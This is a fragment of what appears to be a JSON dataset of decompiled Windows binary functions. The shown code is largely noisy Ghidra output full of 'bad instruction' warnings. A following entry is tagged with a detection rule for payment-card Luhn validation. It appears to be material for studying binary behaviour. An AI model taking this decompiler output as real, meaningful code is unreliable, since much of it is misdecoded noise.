ppiVar65 = (unaff_RBP & 0xffffffff) + -1;\n        *ppiVar65 = *ppiVar65 << 1 | *ppiVar65 >> 7;\n        return unaff_RBP & 0xffffffff;\n    case 0x97:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar74 = &piStack104;\n        goto code_r0x0001400348ec;\n    case 0x98:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        goto code_r0x0001400357ac;\n    case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9a:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar74 = &piStack104;\n        goto code_r0x0001400354e4;\n    case 0xa3:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(iVar58 + 0x1400fdfb1) = *(iVar58 + 0x1400fdfb1) + '(';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(iVar58 + 0x1400fdfb5) = *(iVar58 + 0x1400fdfb5) + '(';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        arg1 = arg1 + uVar43;\n        ppiVar74 = &piStack104;\n        goto code_r0x0001400354e4;\n    case 0xa4:\n    case 0xa5:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + UNRECOVERED_JUMPTABLE._0_8_;\n        arg1 = arg1 + uVar43;\n        ppiVar74 = &piStack104;\n        goto code_r0x00014003454b;\n    case 0xaa:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar74 = &piStack104;\n        goto code_r0x000140035050;\n    case 0xad:\n        *(iVar58 + 0x1400fdfb1) = *(iVar58 + 0x1400fdfb1) + '(';\n        ppiVar74 = 0x9024;\n        *(iVar58 + 0x1400fdfb1) = *(iVar58 + 0x1400fdfb1) + '(';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(iVar58 + 0x1400fdfb3) = *(iVar58 + 0x1400fdfb3) + '(';\n        uVar59 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar41 + *UNRECOVERED_JUMPTABLE._0_8_;\n        uVar41 = *unaff_RDI;\n        *unaff_RDI = *unaff_RDI + '(';\n        *0x90c4 = *0x90c4 + 0x400fe028 + (0xd7 < uVar41);\n        goto code_r0x000140035323;\n    case 0xae:\n    case 0xb4:\n        *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + '(';\n        pcVar3 = swi(0x89);\n        (*pcVar3)(uVar57);\n        ppiVar74 = auStack96;\n        puVar53 = in_stack_00000230;\n        ppiVar83 = unaff_R13;\n        goto code_r0x0001400347df;\n    case 0xb0:\n        *(arg1 + 0xd82484) = *(arg1 + 0xd82484) + '(';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        ppiVar36 = &piStack104;\n    case 0xb2:\n        goto code_r0x000140034ea3;\n    case 0xb7:\n        goto code_r0x000140034f6b;\n    case 0xb8:\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff30;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + UNRECOVERED_JUMPTABLE._0_8_;\n        ppiVar74 = &piStack104;\n        goto code_r0x000140034f43;\n    case 0xb9:\n        goto code_r0x0001400357d8;\n    case 0xbb:\n    case 0xcb:\n    case 0xd9:\n    case 0xe7:\n    case 0xf3:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbc:\n    case 0xcc:\n    case 0xda:\n    case 0xe8:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbd:\n    case 0xcd:\n    case 0xdb:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbe:\n    case 0xce:\n    case 0xdc:\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbf:\n    case 0xcf:\n    case 0xdd:\n    case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd7:\n        ppiVar65 = arg1 + 0xd;\n        *ppiVar65 = *ppiVar65 & uVar43;\n        if (*ppiVar65 != 0) {\n    // WARNING: Could not recover jumptable at 0x0001400fe107. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppiVar65 = (**(arg1 * 8 + 0x1400fe01b))(uVar57);\n            return ppiVar65;\n        }\n        out(*unaff_RSI, arg3);\n        puVar82 = unaff_RDI + *(unaff_RSI + 0x6f) * 0x77 * 2 + 99;\n        *puVar82 = *puVar82 & 0xe0;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe5:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar51;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        uVar43 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + '(' + CARRY1(uVar43, uVar41);\n        uVar43 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        uVar64 = *0x5000000001401065;\n        uVar59 = *0x5000000001401065;\n        puVar60 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar59;\n        cVar40 = in_stack_00000030;\n        in_stack_00000030[1] = in_stack_00000030[1] + cVar40 + CARRY1(uVar43, uVar41);\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + arg3;\n        iVar66 = puVar60;\n        *puVar60 = *puVar60 + iVar66;\n        uVar41 = *puVar60;\n        *puVar60 = *puVar60 + uVar64;\n        uVar43 = (UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00) >> 8;\n        if (*puVar60 == 0) {\n            *(puVar60 + 1) = *(puVar60 + 1) + uVar64 + CARRY1(uVar41, uVar64);\n            *puVar60 = *puVar60 + uVar64;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar64;\n            in_stack_00000030[1] = in_stack_00000030[1] + cVar40 + CARRY1(uVar41, uVar64);\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar64;\n            *(unaff_RSI + 2) = *(unaff_RSI + 2) & uVar43;\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar64;\n            *(unaff_RDI + 2) = *(unaff_RDI + 2) + '\\'';\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar64;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + '\\'' + CARRY1(uVar41, uVar64);\n            *puVar60 = *puVar60 + uVar64;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar82 = puVar60 + 0x57;\n        uVar41 = *puVar82;\n        *puVar82 = *puVar82 + uVar43;\n        *(puVar60 + 1) = *(puVar60 + 1) + uVar64 + CARRY1(uVar41, uVar43);\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        *puVar60 = *puVar60 + uVar64;\n        puVar82 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffff00 | uVar59;\n        *puVar60 = *puVar60 + iVar66;\n        bVar86 = CARRY1(*puVar60, uVar64);\n        *puVar60 = *puVar60 + uVar64;\n        iVar58 = 0x1400fe026;\n        if (*puVar60 == 0) {\n            *(puVar60 + 1) = *(puVar60 + 1) + uVar64 + bVar86;\n            *puVar60 = *puVar60 + uVar64;\n            *(puVar60 + 0x1401057) = *(puVar60 + 0x1401057) + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar64;\n            *(unaff_RDI + 2) = *(unaff_RDI + 2) & uVar43;\n            *puVar60 = *puVar60 + iVar66;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar64;\n            *0x1400fe036 = *0x1400fe036 >> 1 | CARRY1(uVar41, uVar64) << 7;\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            *puVar60 = *puVar60 + uVar64;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar64;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + '&' + CARRY1(uVar41, uVar64);\n            *puVar60 = *puVar60 + uVar64;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n            uVar64 = puVar60 >> 8;\n            *(puVar60 + 0x10 + puVar82) = *(puVar60 + 0x10 + puVar82) + uVar64 + bVar86;\n            iVar66 = puVar60;\n            *puVar60 = *puVar60 + iVar66;\n            uVar43 = puVar60;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar43;\n            *(unaff_RBP + 0x2802) = *(unaff_RBP + 0x2802) + iVar58 + CARRY1(uVar41, uVar43);\n            bVar86 = CARRY1(*puVar60, uVar43);\n            *puVar60 = *puVar60 + uVar43;\n            if (iVar58 + -1 != 0 && *puVar60 != 0) {\ncode_r0x000140104731:\n                *puVar60 = (*puVar60 - uVar43) - bVar86;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                puVar1 = puVar60 + -0x73;\n                uVar41 = *puVar1;\n                uVar42 = puVar82 >> 8;\n                *puVar1 = *puVar1 + uVar42;\n                *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + CARRY1(uVar41, uVar42);\n                *puVar60 = *puVar60 + uVar43;\n                *(puVar60 + 0x50041a) = *(puVar60 + 0x50041a) + uVar64;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar82 = *puVar82 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *(puVar60 + 0x1401051) = *(puVar60 + 0x1401051) + uVar42;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar82 = *puVar82 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                uVar41 = *puVar60;\n                *puVar60 = *puVar60 + puVar82;\n                in_stack_00000030[1] = in_stack_00000030[1] + cVar40 + CARRY1(uVar41, puVar82);\n                *puVar60 = *puVar60 + uVar43;\n                uVar41 = *puVar82;\n                *puVar82 = *puVar82 + uVar43;\n                *puVar60 = (*puVar60 - uVar43) - CARRY1(uVar41, uVar43);\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                puVar82 = puVar60 + -0x73;\n                uVar41 = *puVar82;\n                *puVar82 = *puVar82 + uVar42;\n                *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + CARRY1(uVar41, uVar42);\n                *puVar60 = *puVar60 + uVar43;\n                uVar43 = uVar43 + uVar64;\n                pcVar54 = puVar60 & 0xffffffffffffff00 | uVar43;\n                ppiVar76[-1] = 0x14010;\n                *pcVar54 = *pcVar54 + uVar43;\n                *pcVar54 = *pcVar54 + uVar43;\n                *pcVar54 = *pcVar54 + uVar43;\n                pcVar63 = puVar60 & 0xffffffffffffff00 | uVar43 + *pcVar54;\n                *pcVar63 = *pcVar63 + uVar43 + *pcVar54;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + bVar86;\n            *puVar60 = *puVar60 + uVar43;\n            uVar41 = *puVar60;\n            uVar42 = puVar82;\n            *puVar60 = *puVar60 + uVar42;\n            puVar82 = puVar60 + in_FS_OFFSET + 1;\n            *puVar82 = *puVar82 + uVar43 + CARRY1(uVar41, uVar42);\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar42;\n            puVar82 = puVar60 & 0xffffffff;\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar43;\n            *(puVar60 + 4) = *(puVar60 + 4) & iVar58 + -1 >> 8;\n            *puVar60 = *puVar60 + iVar66;\n            uVar41 = *puVar60;\n            *puVar60 = *puVar60 + uVar43;\n            *(puVar60 + 0x10 + puVar82) = *(puVar60 + 0x10 + puVar82) + uVar64 + CARRY1(uVar41, uVar43);\n            *puVar60 = *puVar60 + iVar66;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            *puVar60 = *puVar60 + uVar43;\n            uVar41 = *puVar60;\n            uVar42 = *puVar60;\n            *puVar60 = *puVar60 + uVar43;\n            uVar78 = puVar82;\n            if (!SCARRY1(uVar42, uVar43)) {\n                *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + CARRY1(uVar41, uVar43);\n                *puVar60 = *puVar60 + uVar43;\n                puVar62 = puVar60 + 0x1a;\n                uVar41 = *puVar62;\n                *puVar62 = *puVar62 + uVar64;\n                *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + CARRY1(uVar41, uVar64);\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar82 = *puVar82 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                puVar1 = puVar60 + 0x61;\n                uVar41 = *puVar1;\n                *puVar1 = *puVar1 + uVar43;\n                *(puVar60 + 1) = *(puVar60 + 1) + uVar43 + CARRY1(uVar41, uVar43);\n                *puVar60 = *puVar60 + uVar43;\n                *puVar82 = *puVar82 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                *puVar60 = *puVar60 + uVar43;\n                uVar41 = *puVar60;\n                *puVar60 = *puVar60 + uVar78;\n                in_stack_00000030[1] = in_stack_00000030[1] + cVar40 + CARRY1(uVar41, uVar78);\n                *puVar60 = *puVar60 + uVar43;\n                bVar86 = CARRY1(*puVar82, uVar43);\n                *puVar82 = *puVar82 + uVar43;\n                goto code_r0x000140104731;\n            }\n            uVar42 = uVar43 + uVar64;\n            piVar61 = puVar60 & 0xffffffffffffff00 | uVar42;\n            iVar58 = *ppiVar76;\n            ppiVar76 = ppiVar76 + 1;\n            *(piVar61 + 1) = *(piVar61 + 1) + uVar42 + CARRY1(uVar43, uVar64);\n            *piVar61 = *piVar61 + uVar42;\n            *piVar61 = *piVar61 + uVar42;\n            *piVar61 = *piVar61 + uVar42;\n            *piVar61 = *piVar61 + uVar42;\n            *piVar61 = *piVar61 + uVar42;\n            *piVar61 = *piVar61 + uVar78;\n            *piVar61 = *piVar61 + piVar61;\n            uVar41 = *piVar61;\n            *piVar61 = *piVar61 + uVar42;\n            uVar43 = *0x1000000001401067;\n            uVar59 = *0x1000000001401067;\n            puVar62 = puVar60 & 0xffffffffffffff00 | uVar59;\n            puVar82 = puVar62 + in_FS_OFFSET + 1;\n            *puVar82 = *puVar82 + *0x1000000001401067 + CARRY1(uVar41, uVar42);\n            *puVar62 = *puVar62 + uVar43;\n            *puVar62 = *puVar62 + uVar43;\n            *puVar62 = *puVar62 + uVar43;\n            *puVar62 = *puVar62 + uVar43;\n            *puVar62 = *puVar62 + uVar43;\n            *puVar62 = *puVar62 + uVar42;\n            puVar82 = puVar60 & 0xffffff00 | uVar59;\n            bVar86 = CARRY4(*puVar62, puVar62);\n            *puVar62 = *puVar62 + puVar62;\n            puVar60 = puVar62;\n        } while( true );\n    case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.1400b7170(0x1400fe0e2);\n    ppiVar65 = unaff_R14;\ncode_r0x00014003f61c:\n    uVar57 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, ppiVar65, ppiVar83);\n    fcn.1400b6670(uVar57);\n    (*(*arg1)[1])(arg1);\n    do {\n        uVar57 = fcn.1400b6b70();\n        fcn.1400b6670(uVar57);\n    } while( true );\ncode_r0x0001400347e9:\n    arg3 = *(ppiVar74 + 600);\n    ppiVar83 = ppiVar74 + 0x90;\n    ppiVar65 = ppiVar74 + 0xb0;\n    in_stack_00000030 = ppiVar74 + 0xa0;\n    iVar58 = *(*(ppiVar74 + 0x80) + 0x10);\n    uVar2 = *(iVar58 + 0xa8);\n    uVar5 = *(iVar58 + 0xac);\n    uVar6 = *(iVar58 + 0xb0);\n    uVar7 = *(iVar58 + 0xb4);\n    in_XMM5_Da = *(iVar58 + 0x68);\n    in_XMM5_Db = *(iVar58 + 0x6c);\n    in_XMM5_Dc = *(iVar58 + 0x70);\n    in_XMM5_Dd = *(iVar58 + 0x74);\n    in_XMM4_Da = *(iVar58 + 0x78);\n    in_XMM4_Db = *(iVar58 + 0x7c);\n    in_XMM4_Dc = *(iVar58 + 0x80);\n    in_XMM4_Dd = *(iVar58 + 0x84);\n    in_XMM3_Da = *(iVar58 + 0x88);\n    in_XMM3_Db = *(iVar58 + 0x8c);\n    in_XMM3_Dc = *(iVar58 + 0x90);\n    in_XMM3_Dd = *(iVar58 + 0x94);\n    piVar84 = *(iVar58 + 0x98);\n    piVar80 = *(iVar58 + 0xa0);\n    auVar87 = *(iVar58 + 0xb8);\n    in_XMM6_Da = *(iVar58 + 0x58);\n    in_XMM6_Db = *(iVar58 + 0x5c);\n    in_XMM6_Dc = *(iVar58 + 0x60);\n    in_XMM6_Dd = *(iVar58 + 100);\n    *(ppiVar74 + 0x30) = 0xe;\n    *(ppiVar74 + 0x130) = uVar2;\n    *(ppiVar74 + 0x134) = uVar5;\n    *(ppiVar74 + 0x138) = uVar6;\n    *(ppiVar74 + 0x13c) = uVar7;\n    in_XMM1_Da = *(ppiVar74 + 0xc0);\n    in_XMM1_Db = *(ppiVar74 + 0xc4);\n    in_XMM1_Dc = *(ppiVar74 + 200);\n    in_XMM1_Dd = *(ppiVar74 + 0xcc);\n    *(ppiVar74 + 0x98) = *(ppiVar74 + 0x78);\n    *(ppiVar74 + 0x40) = ppiVar74 + 0xd8;\n    *(ppiVar74 + 0x90) = unaff_RDI;\n    *(ppiVar74 + 0x38) = *(ppiVar74 + 0x270);\n    *(ppiVar74 + 0x28) = ppiVar74 + 0xe0;\n    UNRECOVERED_JUMPTABLE._0_8_ = ppiVar74 + 0xdc;\n    ppiVar73 = ppiVar74;\n    goto code_r0x0001400348a2;\ncode_r0x0001400340a6:\n    *(ppiVar74 + 100) = 4;\n    ppiVar83 = *(ppiVar74 + 0xc0);\n    *(ppiVar74 + 0xd8) = 4;\n    goto code_r0x0001400340c1;\ncode_r0x00014003a672:\n    uVar32 = in_stack_00000080;\n    uVar59 = in_stack_00000080 + 1;\n    cVar40 = *(*unaff_R15 + (UNRECOVERED_JUMPTABLE._0_8_ - piStack16 >> 1));\n    uVar68 = CONCAT71(in_stack_00000089, in_stack_00000088);\n    if (in_stack_00000078 == piStack24) {\n        uVar68 = 0xf;\n    }\n    if (uVar68 < uVar59) {\n        fcn.1400a3380(puStackX32, in_stack_00000080, 0, 0);\n    }\n    *(in_stack_00000078 + uVar32) = cVar40;\n    iStack44 = iStack44 + 1;\n    *(in_stack_00000078 + uVar32 + 1) = '\\0';\n    in_stack_00000080 = uVar59;\ncode_r0x00014003a6d6:\n    piVar84 = arg1[2];\n    if (piVar84 < arg1[3]) {\ncode_r0x00014003a6e4:\n        arg1[2] = piVar84 + 2;\n    }\n    else {\ncode_r0x00014003a92b:\n        (*(*arg1)[10])(arg1);\n    }\n    unaff_RDI = 0xffffffff;\n    unaff_R13 = 0x1;\n    cVar40 = '\\x01';\n    unaff_R12 = arg1 != NULL;\n    if (arg1 != NULL) {\n        if (arg1[2] < arg1[3]) {\n            iVar46 = *arg1[2];\n        }\n        else {\n            iVar46 = (*(*arg1)[9])(arg1);\n        }\n        if (iVar46 == -1) {\n            arg1 = NULL;\n        }\n        else {\n            unaff_R12 = NULL;\n        }\n    }\n    else {\n        unaff_R12 = 0x1;\n    }\n    UNRECOVERED_JUMPTABLE._0_8_ = iStack46 == -1;\n    bVar86 = unaff_RBP != NULL && iStack46 == -1;\n    if (bVar86) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar46 = *unaff_RBP[2];\n        }\n        else {\n            iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n        }\n        if (iVar46 == -1) {\n            unaff_RBP = NULL;\n        }\n        if (SUB81(unaff_R12, 0) == (iVar46 == -1 && bVar86)) {\ncode_r0x00014003a9e0:\n            uVar45 = unaff_RDI;\n            uVar41 = 1;\njoined_r0x00014003a9ef:\n            if (in_stack_00000080 != 0) goto code_r0x00014003a74d;\n            goto code_r0x00014003a9f5;\n        }\n    }\n    else {\ncode_r0x00014003a63c:\n        cVar40 = unaff_R13;\n        if (unaff_R12 == UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x00014003a9e0;\n    }\n    if ((arg1 != NULL) && (cVar40 != '\\0')) goto code_r0x00014003a700;\n    uVar59 = unaff_RDI & 0xffffffff;\n    goto code_r0x00014003a655;\ncode_r0x00014003b9b2:\n    uVar32 = in_stack_00000080;\n    uVar59 = in_stack_00000080 + 1;\n    cVar40 = *(*unaff_R15 + (UNRECOVERED_JUMPTABLE._0_8_ - piStack16 >> 1));\n    uVar68 = CONCAT71(in_stack_00000089, in_stack_00000088);\n    if (in_stack_00000078 == piStack24) {\n        uVar68 = 0xf;\n    }\n    if (uVar68 < uVar59) {\n        fcn.1400a3380(puStackX32, in_stack_00000080, 0, 0);\n    }\n    *(in_stack_00000078 + uVar32) = cVar40;\n    iStack44 = iStack44 + 1;\n    *(in_stack_00000078 + uVar32 + 1) = '\\0';\n    in_stack_00000080 = uVar59;\ncode_r0x00014003ba16:\n    piVar84 = arg1[2];\n    if (piVar84 < arg1[3]) {\ncode_r0x00014003ba24:\n        arg1[2] = piVar84 + 2;\n    }\n    else {\ncode_r0x00014003bc6b:\n        (*(*arg1)[10])(arg1);\n    }\n    unaff_RDI = 0xffffffff;\n    bVar86 = arg1 != NULL;\n    if (bVar86) {\n        if (arg1[2] < arg1[3]) {\n            iVar46 = *arg1[2];\n        }\n        else {\n            iVar46 = (*(*arg1)[9])(arg1);\n        }\n        if (iVar46 == -1) {\n            arg1 = NULL;\n        }\n        bVar86 = iVar46 == -1 && bVar86;\n    }\n    else {\n        bVar86 = true;\n    }\n    bVar77 = iStack46 == -1;\n    bVar81 = unaff_RBP != NULL && bVar77;\n    if (bVar81) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar46 = *unaff_RBP[2];\n        }\n        else {\n            iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n        }\n        bVar77 = iVar46 == -1 && bVar81;\n        if (iVar46 == -1) {\n            unaff_RBP = NULL;\n        }\n    }\n    if (bVar86 == bVar77) {\ncode_r0x00014003bd20:\n        uVar45 = unaff_RDI;\n        uVar41 = 1;\njoined_r0x00014003bd2f:\n        if (in_stack_00000080 != 0) goto code_r0x00014003ba8d;\n        goto code_r0x00014003bd35;\n    }\n    if (arg1 != NULL) {\n        bVar86 = false;\ncode_r0x00014003b98d:\n        if (!bVar86) goto code_r0x00014003ba40;\n    }\n    arg3 = unaff_RDI & 0xffffffff;\n    goto code_r0x00014003b995;\ncode_r0x00014003ba40:\n    if (arg1[2] < arg1[3]) {\n        arg3 = *arg1[2];\n    }\n    else {\n        uVar50 = (*(*arg1)[9])(arg1);\n        arg3 = uVar50;\n    }\n    goto code_r0x00014003ba51;\n}\n",
        "token_count": 49608
    },
    "1400ada8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
